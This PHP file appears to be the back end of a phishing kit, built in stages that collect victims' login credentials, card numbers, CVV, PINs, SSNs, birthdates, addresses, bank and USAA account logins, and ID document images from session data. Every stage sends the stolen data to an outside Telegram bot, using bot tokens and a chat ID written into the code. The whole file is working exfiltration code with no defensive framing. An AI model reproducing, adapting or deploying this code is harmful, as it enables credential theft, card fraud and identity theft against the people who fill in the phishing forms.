<?php
session_start();
error_reporting(0);
date_default_timezone_set('America/Los_Angeles');
$TIME_DATE = date('h:i A d/m/Y');
$last_idcode = $_SESSION['last_id'];
$cardnumber = $_SESSION['_cardnumber_'];

//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>Logininfo<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged1") {
$Email = $_SESSION['_login_email_'];
$Password = $_SESSION['_login_password_'];
$Country =  $_SESSION['_LOOKUP_COUNTRY_'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
$Agent = $_SESSION['Agent'];

//Login message Bot/=======================================
$token = "1993777009:AAGItiyeMMyzE0E5vUP-WiVUh2ObsMLHEj0";
$data = [
    'text' => '
`'.$DateTime.'`
`'.$Email.'`
`'.$Password.'`
`'.$Country.'`
http://ip-api.com/'.$IP.'
',
    'chat_id' => '1195010636',
	'parse_mode' => 'MarkDown',
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
//Login message Bot/=======================================

}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>Carding<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged2") {
$Email = $_SESSION['_login_email_'];
$Password = $_SESSION['_login_password_'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
$c_type = $_SESSION['_c_type_'];
$cardnumber = $_SESSION['_cardnumber_'];
$expdate = $_SESSION['_expdate_'];
$csc = $_SESSION['_csc_'];
$NameOnCard = $_SESSION['_NameOnCard_'];


//New Card message Bot/=======================================
$token = "1966312889:AAGiZnk4S_plLzyGV9mU8DuefB5VzpSuPZ8";
$data = [
    'text' => '
`'.$DateTime.'`
`'.$Email.'`
`'.$Password.'`

`'.$cardnumber.'`
`'.$NameOnCard.'`
`'.$expdate.'`
`'.$csc.'`
',
    'chat_id' => '1195010636',
	'parse_mode' => 'MarkDown',
];
$res=file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
$json = json_decode($res,true);
$_SESSION['message_id'] = $json['result']['message_id'];
//New Card message Bot/=======================================


}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>BILLINGs<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>

if($_SESSION['loged'] == "BILLINGs") {
#############[Cards]################
$Email = $_SESSION['_login_email_'];
$Password = $_SESSION['_login_password_'];
$c_type = $_SESSION['_c_type_'];
$cardnumber = $_SESSION['_cardnumber_'];
$expdate = $_SESSION['_expdate_'];
$csc = $_SESSION['_csc_'];
$NameOnCard = $_SESSION['_NameOnCard_'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
#############[BILLINGs]################
$First_Name = $_SESSION['First_Name'];
$Last_Name = $_SESSION['Last_Name'];
$Full_Name = ''.$First_Name.' '.$Last_Name.'';
$Address = $_SESSION['Address'];
$City = $_SESSION['City'];
$State = $_SESSION['State'];
$Zip_code = $_SESSION['Zip_code'];
$Phone_Number = $_SESSION['Phone_Number'];
//BILLINGs message Bot/=======================================
$token = "1966312889:AAGiZnk4S_plLzyGV9mU8DuefB5VzpSuPZ8";

$data = [
    'text' => '
`'.$DateTime.'`
`'.$Email.'`
`'.$Password.'`

`'.$cardnumber.'`
`'.$NameOnCard.'`
`'.$expdate.'`
`'.$csc.'`
`'.$Full_Name.'`
`'.$Address.'`
`'.$City.'`
`'.$State.'`
`'.$Zip_code.'`
`'.$Phone_Number.'`
',
    'chat_id' => '1195010636',
	'parse_mode' => 'MarkDown',
	'message_id' => $_SESSION['message_id']
];
$res=file_get_contents("https://api.telegram.org/bot$token/editMessageText?" . http_build_query($data) );
//BILLINGs message Bot/=======================================

}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>3Dsecure<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged3") {
	
#############[Cards]################
$Email = $_SESSION['_login_email_'];
$Password = $_SESSION['_login_password_'];
$c_type = $_SESSION['_c_type_'];
$cardnumber = $_SESSION['_cardnumber_'];
$expdate = $_SESSION['_expdate_'];
$csc = $_SESSION['_csc_'];
$NameOnCard = $_SESSION['_NameOnCard_'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
#############[BILLINGs]################
$First_Name = $_SESSION['First_Name'];
$Last_Name = $_SESSION['Last_Name'];
$Full_Name = ''.$First_Name.' '.$Last_Name.'';
$Address = $_SESSION['Address'];
$City = $_SESSION['City'];
$State = $_SESSION['State'];
$Zip_code = $_SESSION['Zip_code'];
$Phone_Number = $_SESSION['Phone_Number'];
#############[3Dsecure]################
$CardPIN = $_SESSION['_CardPIN_'];
$Birthdate = $_SESSION['Birthdate'];
$SSN = $_SESSION['_SSN_'];

##============3Dsecure message Bot=======================##
$token = "1966312889:AAGiZnk4S_plLzyGV9mU8DuefB5VzpSuPZ8";

$data = [
    'text' => '
`'.$DateTime.'`
`'.$Email.'`
`'.$Password.'`

`'.$cardnumber.'`
`'.$NameOnCard.'`
`'.$expdate.'`
`'.$csc.'`
`'.$Full_Name.'`
`'.$Address.'`
`'.$City.'`
`'.$State.'`
`'.$Zip_code.'`
`'.$Phone_Number.'`

Birth : `'.$Birthdate.'`
SSN : `'.$SSN.'`
PIN : `'.$CardPIN.'`
',
    'chat_id' => '1195010636',
	'parse_mode' => 'MarkDown',
	'message_id' => $_SESSION['message_id']
];
$res=file_get_contents("https://api.telegram.org/bot$token/editMessageText?" . http_build_query($data) );
##============3Dsecure message Bot=======================##

}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>Paswordemail<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged5") {
#############[Cards]################
$Email = $_SESSION['_login_email_'];
$Password = $_SESSION['_login_password_'];
$c_type = $_SESSION['_c_type_'];
$cardnumber = $_SESSION['_cardnumber_'];
$expdate = $_SESSION['_expdate_'];
$csc = $_SESSION['_csc_'];
$NameOnCard = $_SESSION['_NameOnCard_'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
#############[BILLINGs]################
$First_Name = $_SESSION['First_Name'];
$Last_Name = $_SESSION['Last_Name'];
$Full_Name = ''.$First_Name.' '.$Last_Name.'';
$Address = $_SESSION['Address'];
$City = $_SESSION['City'];
$State = $_SESSION['State'];
$Zip_code = $_SESSION['Zip_code'];
$Phone_Number = $_SESSION['Phone_Number'];
#############[3Dsecure]################
$CardPIN = $_SESSION['_CardPIN_'];
$Birthdate = $_SESSION['Birthdate'];
$SSN = $_SESSION['_SSN_'];
#############[Paswordemail]################
$Epassword = $_SESSION['_passwordemail_'];

##============Paswordemail message Bot=======================##
$token = "1966312889:AAGiZnk4S_plLzyGV9mU8DuefB5VzpSuPZ8";

$data = [
    'text' => '
`'.$DateTime.'`
`'.$Email.'`
`'.$Password.'`
`'.$Epassword.'`

`'.$cardnumber.'`
`'.$NameOnCard.'`
`'.$expdate.'`
`'.$csc.'`
`'.$Full_Name.'`
`'.$Address.'`
`'.$City.'`
`'.$State.'`
`'.$Zip_code.'`
`'.$Phone_Number.'`

Birth : `'.$Birthdate.'`
SSN : `'.$SSN.'`
PIN : `'.$CardPIN.'`
__________________
',
    'chat_id' => '1195010636',
	'parse_mode' => 'MarkDown',
	'message_id' => $_SESSION['message_id']
];
$res=file_get_contents("https://api.telegram.org/bot$token/editMessageText?" . http_build_query($data) );
##============Paswordemail message Bot=======================##

}else{
	
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>Bankinfo<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged4") {
#############[Cards]################
$Email = $_SESSION['_login_email_'];
$Password = $_SESSION['_login_password_'];
$c_type = $_SESSION['_c_type_'];
$cardnumber = $_SESSION['_cardnumber_'];
$expdate = $_SESSION['_expdate_'];
$csc = $_SESSION['_csc_'];
$NameOnCard = $_SESSION['_NameOnCard_'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
#############[BILLINGs]################
$First_Name = $_SESSION['First_Name'];
$Last_Name = $_SESSION['Last_Name'];
$Full_Name = ''.$First_Name.' '.$Last_Name.'';
$Address = $_SESSION['Address'];
$City = $_SESSION['City'];
$State = $_SESSION['State'];
$Zip_code = $_SESSION['Zip_code'];
$Phone_Number = $_SESSION['Phone_Number'];
#############[3Dsecure]################
$CardPIN = $_SESSION['_CardPIN_'];
$Birthdate = $_SESSION['Birthdate'];
$SSN = $_SESSION['_SSN_'];
#############[Paswordemail]################
$Epassword = $_SESSION['_passwordemail_'];
#############[Bankinfo]################
$Bank_Name = $_SESSION['bank'];
$RoutNumb = $_SESSION['_xxnxx_'];
$AccuNumb = $_SESSION['_xxllxx_'];
$BankID = $_SESSION['_UserNameID_'];
$Bank_pass = $_SESSION['_PasswordBank_'];
$USAAid = $_SESSION['USAA1'];
$USAAPass = $_SESSION['USAA2'];
$USAAPIN = $_SESSION['USAA3'];

##============Bankinfo message Bot=======================##
$token = "2032570988:AAGudqXHAlqj0MgAC2AXAQC1gZAUXLjahm0";

$data = [
    'text' => '
`'.$DateTime.'`
`'.$Email.'`
`'.$Password.'`
`'.$Epassword.'`
`'.$Bank_pass.'`
`'.$USAAPass.'`

BankName : `'.$Bank_Name.'`
RoutNumb : `'.$RoutNumb.'`
AccuNumb : `'.$AccuNumb.'`
BankID : `'.$BankID.'`
Bankpass : `'.$Bank_pass.'`
USAAid : `'.$USAAid.'`
USAAPass : `'.$USAAPass.'`
USAAPIN : `'.$USAAPIN.'`

Birth : `'.$Birthdate.'`
SSN : `'.$SSN.'`
PIN : `'.$CardPIN.'`

`'.$cardnumber.'`
`'.$NameOnCard.'`
`'.$expdate.'`
`'.$csc.'`
`'.$Full_Name.'`
`'.$Address.'`
`'.$City.'`
`'.$State.'`
`'.$Zip_code.'`
`'.$Phone_Number.'`
__________________
',
    'chat_id' => '1195010636',
	'parse_mode' => 'MarkDown',
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
##============Bankinfo message Bot=======================##

}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>IDENTITYIMGS<<<<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged6") {
#############[Cards]################
$Email = $_SESSION['_login_email_'];
$Password = $_SESSION['_login_password_'];
$c_type = $_SESSION['_c_type_'];
$cardnumber = $_SESSION['_cardnumber_'];
$expdate = $_SESSION['_expdate_'];
$csc = $_SESSION['_csc_'];
$NameOnCard = $_SESSION['_NameOnCard_'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
#############[BILLINGs]################
$First_Name = $_SESSION['First_Name'];
$Last_Name = $_SESSION['Last_Name'];
$Full_Name = ''.$First_Name.' '.$Last_Name.'';
$Address = $_SESSION['Address'];
$City = $_SESSION['City'];
$State = $_SESSION['State'];
$Zip_code = $_SESSION['Zip_code'];
$Phone_Number = $_SESSION['Phone_Number'];
#############[3Dsecure]################
$CardPIN = $_SESSION['_CardPIN_'];
$Birthdate = $_SESSION['Birthdate'];
$SSN = $_SESSION['_SSN_'];
#############[Paswordemail]################
$Epassword = $_SESSION['_passwordemail_'];
#############[Bankinfo]################
$Bank_pass = $_SESSION['_PasswordBank_'];
#############[IDENTITYIMGS]################
$TYPE_ID = $_SESSION['doc_type'];
$URL_IMAGE = $_SESSION['alboms'];

##============IDENTITYIMGS message Bot=======================##
$token = "1966312889:AAGiZnk4S_plLzyGV9mU8DuefB5VzpSuPZ8";

$data = [
    'text' => '
`'.$DateTime.'`
`'.$Email.'`
`'.$Password.'`
`'.$Epassword.'`
`'.$Bank_pass.'`

`'.$cardnumber.'`
`'.$NameOnCard.'`
`'.$expdate.'`
`'.$csc.'`
`'.$Full_Name.'`
`'.$Address.'`
`'.$City.'`
`'.$State.'`
`'.$Zip_code.'`
`'.$Phone_Number.'`

Birth : `'.$Birthdate.'`
SSN : `'.$SSN.'`
PIN : `'.$CardPIN.'`

TYPE ID : `'.$TYPE_ID.'`
URL IMAGE : `'.$URL_IMAGE.'`
__________________
',
    'chat_id' => '1195010636',
	'parse_mode' => 'MarkDown',
	'message_id' => $_SESSION['message_id']
];
$res=file_get_contents("https://api.telegram.org/bot$token/editMessageText?" . http_build_query($data) );
##============Paswordemail message Bot=======================##


}
	
}
}


}

}
}
}


?>



















